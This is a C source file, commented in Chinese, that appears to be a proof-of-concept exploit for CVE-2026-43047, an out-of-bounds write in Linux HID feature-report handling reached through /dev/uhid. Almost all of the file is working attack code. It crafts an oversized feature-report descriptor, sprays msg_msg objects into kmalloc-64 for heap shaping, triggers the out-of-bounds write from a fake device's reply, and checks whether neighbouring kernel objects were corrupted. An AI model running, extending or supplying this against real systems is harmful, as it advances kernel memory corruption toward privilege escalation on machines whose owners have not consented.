/* uhid_msgmsg.c — CVE-2026-43047 + msg_msg 堆整形                      §DG
 *
 * 思路：
 *   ① 让 Device Capabilities FEATURE 报告(ID 2)更大(~28B)
 *      ⇒ hid_alloc_report_buf → kmalloc(35) → kmalloc-64
 *   ② msgsnd() 喷射 msg_msg(16B 消息体 + 48B 头 = 64B)填满 kmalloc-64
 *   ③ 触发 OOB：memset 清零相邻 msg_msg 的头部
 *      ⇒ m_ts / m_list.next 被清零
 *   ④ msgrcv() 检查是否有异常(消息大小变化等)
 *
 * 安全：只做 IPC 操作和 uhid 设备创建，不写文件。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>

#define EVSZ 4380
#define BIG_REPORT_ID 1
#define T_FEATURE 9
#define T_FEATURE_ANSWER 10

static unsigned char ev[EVSZ];
static int g_mode = 0;   /* 0=safe 1=oob */
static int g_get_seen = 0;
static int g_reply_ok = 0;

static void wr32(int o, uint32_t v) { memcpy(ev + o, &v, 4); }
static void wr16(int o, uint16_t v) { memcpy(ev + o, &v, 2); }
static uint32_t rd32(int o) { uint32_t v; memcpy(&v, ev + o, 4); return v; }

/* ============ 描述符：WPTP + 大 FEATURE 报告(ID 2) ============ */
static unsigned char desc[4096];
static int desc_len;

static void build_desc(void) {
    int n = 0;
    /* WPTP 输入部分 (Report ID 1) */
    unsigned char wptp_in[] = {
        0x05,0x0D, 0x09,0x05, 0xA1,0x01,
        0x85,0x01,
        0x09,0x56, 0x24,0x00, 0x26,0xFF,0xFF, 0x75,0x10, 0x95,0x01, 0x81,0x02,
        0x09,0x54, 0x25,0x05, 0x75,0x08, 0x81,0x02,
        0x05,0x0D, 0x09,0x22, 0xA1,0x02,
            0x09,0x51, 0x25,0x0F, 0x75,0x04, 0x95,0x01, 0x81,0x02,
            0x09,0x42, 0x25,0x01, 0x75,0x01, 0x81,0x02,
            0x09,0x47, 0x81,0x02,
            0x95,0x05, 0x81,0x03,
            0x05,0x01, 0x09,0x30, 0x15,0x00, 0x26,0xC8,0x00, 0x35,0x00,
            0x45,0x69, 0x65,0x11, 0x75,0x10, 0x95,0x01, 0x81,0x02,
            0x09,0x31, 0x26,0x96,0x00, 0x45,0x4B, 0x81,0x02,
        0xC0,
        0x05,0x09, 0x09,0x01, 0x15,0x00, 0x25,0x01, 0x75,0x01, 0x95,0x01,
        0x81,0x02, 0x95,0x07, 0x81,0x03,
    };
    /* Device Capabilities FEATURE 报告(ID 2)——★ 加大到 216 bits */
    unsigned char feat[] = {
        0x85,0x02,
        0x05,0x0D,
        0x09,0x55, 0x25,0x05, 0x75,0x08, 0x95,0x01, 0xB1,0x02,  /* ContactMax 8b */
        0x09,0x59, 0x25,0x02, 0xB1,0x02,                        /* ButtonType 8b */
        0x09,0xB0, 0x75,0x08, 0x95,0x18, 0xB1,0x02,             /* ★ padding 8×24=192b */
    };
    /* 其余 FEATURE 报告 */
    unsigned char rest[] = {
        0x85,0x40,
        0x05,0x0D, 0x09,0xB0, 0x15,0x01, 0x25,0x03, 0x35,0x6E, 0x45,0xBE,
        0x65,0x12, 0x75,0x02, 0x95,0x01, 0xB1,0x02,
        0x85,0x41,
        0x05,0x0E, 0x09,0x01, 0xA1,0x02,
            0x09,0x23, 0x15,0x00, 0x25,0x04, 0x75,0x08, 0x95,0x01, 0xB1,0x02,
        0xC0,
        0xC0,   /* End Collection (Application) */
    };
    memcpy(desc+n, wptp_in, sizeof(wptp_in)); n += sizeof(wptp_in);
    memcpy(desc+n, feat, sizeof(feat));       n += sizeof(feat);
    memcpy(desc+n, rest, sizeof(rest));       n += sizeof(rest);
    desc_len = n;
    /* 验证 hid_report_len: report->size = 8+8+192 = 208 bits + 8(report id) = 216
       hid_report_len = ((216-1)>>3)+1 + 1 = 27+1+1 = 29
       hid_alloc_report_buf → kmalloc(29+7=36) → kmalloc-64 ✓ */
}

/* ============ System V msg_msg 喷射 ============ */
struct msgbuf_small {
    long mtype;
    char mtext[16];   /* 16B 数据 + 48B 头 = 64B → kmalloc-64 */
};

static int msqids[64];
static int n_msqids = 0;

static void msg_spray(int count) {
    struct msgbuf_small msg;
    int sprayed = 0;
    memset(&msg, 0x41, sizeof(msg));   /* 填充 0x41 便于识别 */
    msg.mtype = 1;
    for (int i = 0; i < count; i++) {
        if (i % 32 == 0) {
            /* 每 32 个消息创建一个新队列(每个队列默认最大 ~16KB) */
            if (n_msqids < 64) {
                msqids[n_msqids] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
                if (msqids[n_msqids] < 0) break;
                n_msqids++;
            }
        }
        int q = msqids[n_msqids - 1];
        if (msgsnd(q, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0)
            sprayed++;
    }
    printf("  msg_msg 喷射: %d/%d 成功 (%d 队列)\n", sprayed, count, n_msqids);
}

static void msg_cleanup(void) {
    for (int i = 0; i < n_msqids; i++)
        if (msqids[i] >= 0) msgctl(msqids[i], IPC_RMID, NULL);
}

/* ============ sysfs 绑定检查(纯 C) ============ */
static void show_binding(void) {
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.') continue;
        char path[512], link[512];
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(path, link, sizeof(link)-1);
        if (n < 0) n = 0; link[n] = 0;
        const char *drv = strrchr(link, '/'); drv = drv ? drv+1 : link;
        printf("  %s → %s\n", de->d_name, n > 0 ? drv : "(未绑定)");
    }
    closedir(d);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    g_mode = (argc > 1 && strcmp(argv[1], "oob") == 0) ? 1 : 0;
    int spray_count = (argc > 2) ? atoi(argv[2]) : 512;

    printf("=== uhid_msgmsg: CVE-2026-43047 + msg_msg 堆整形 ===\n");
    printf("模式: %s   喷射: %d 个 msg_msg\n", g_mode ? "oob" : "safe", spray_count);

    build_desc();
    printf("描述符 %d 字节 (FEATURE 报告 ID 2 ≈ 28B → kmalloc-64)\n", desc_len);

    /* 步骤 1: msg_msg 喷射 */
    printf("\n[1] msg_msg 堆喷射...\n");
    msg_spray(spray_count);

    /* 步骤 2: 创建 uhid 设备 */
    printf("\n[2] 创建 uhid 设备...\n");
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open 失败 errno=%d\n", errno); return 1; }
    memset(ev, 0, EVSZ);
    wr32(0, 0);   /* legacy CREATE */
    strncpy((char*)(ev+4), "uhid_msgmsg", 127);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260, &p, 8);
    wr16(268, (uint16_t)desc_len);
    wr16(270, 0x0003);
    wr32(272, 0x1234); wr32(276, 0x5678); wr32(280, 1);
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("  CREATE → ret=%zd errno=%d\n", w, errno);
    if (w < 0) { msg_cleanup(); return 1; }

    /* 步骤 3: 事件循环 */
    printf("\n[3] 事件循环...\n");
    struct timeval t0; gettimeofday(&t0, NULL);
    for (;;) {
        struct timeval now; gettimeofday(&now, NULL);
        if (now.tv_sec - t0.tv_sec > 10) break;
        struct timeval tv = {1, 0};
        fd_set rf; FD_ZERO(&rf); FD_SET(fd, &rf);
        if (select(fd+1, &rf, NULL, NULL, &tv) <= 0) continue;
        ssize_t r = read(fd, ev, EVSZ);
        if (r <= 0) continue;
        uint32_t type = rd32(0);

        if (type == 2) { printf("  <START>\n"); continue; }
        if (type == 4) { printf("  <OPEN>\n"); continue; }
        if (type != T_FEATURE) continue;

        uint32_t id = rd32(4);
        uint8_t rnum = ev[8], rtype = ev[9];
        printf("  ★ GET_REPORT: id=%u rnum=%u rtype=%u\n", id, rnum, rtype);
        g_get_seen = 1;

        /* 回复 */
        memset(ev, 0, EVSZ);
        wr32(0, T_FEATURE_ANSWER);
        wr32(4, id);      /* id 必须匹配 */
        wr16(8, 0);       /* err = 0 */
        wr16(10, 3);      /* size = 3 (匹配 count) */
        ev[12] = g_mode ? BIG_REPORT_ID : 0;   /* data[0] */
        ev[13] = 0x42; ev[14] = 0x43;          /* data[1..2] 标记 */
        errno = 0;
        ssize_t rw = write(fd, ev, EVSZ);
        g_reply_ok = (rw > 0);
        printf("  回复(type=%d data[0]=%02x) → ret=%zd errno=%d %s\n",
               T_FEATURE_ANSWER, ev[12], rw, errno,
               g_reply_ok ? "✓" : "✗");
        if (g_mode) { sleep(3); break; }
    }

    /* 步骤 4: 检查 msg_msg 是否被破坏 */
    printf("\n[4] 检查 msg_msg 完整性...\n");
    int corrupted = 0;
    for (int qi = 0; qi < n_msqids; qi++) {
        if (msqids[qi] < 0) continue;
        struct msgbuf_small msg;
        /* 尝试读取每条消息，看大小/类型是否正常 */
        while (msgrcv(msqids[qi], &msg, sizeof(msg.mtext), 0, IPC_NOWAIT | MSG_NOERROR) > 0) {
            for (int i = 0; i < (int)sizeof(msg.mtext); i++) {
                if (msg.mtext[i] != 0x41) {
                    printf("  ★★ 消息数据被修改! q=%d mtext[%d]=0x%02x\n",
                           msqids[qi], i, (unsigned char)msg.mtext[i]);
                    corrupted++;
                    break;
                }
            }
        }
    }
    printf("  msg_msg 异常: %d 条\n", corrupted);

    printf("\n绑定状态:\n");
    show_binding();

    if (g_get_seen && g_reply_ok)
        printf("\n★ 链路已执行: feature 请求+回复均成功\n");
    if (corrupted > 0)
        printf("★★ 检测到 msg_msg 被越界写修改 — OOB 已命中活对象!\n");

    printf("\n=== 结束, 进程存活 ===\n");
    msg_cleanup();
    close(fd);
    return 0;
}
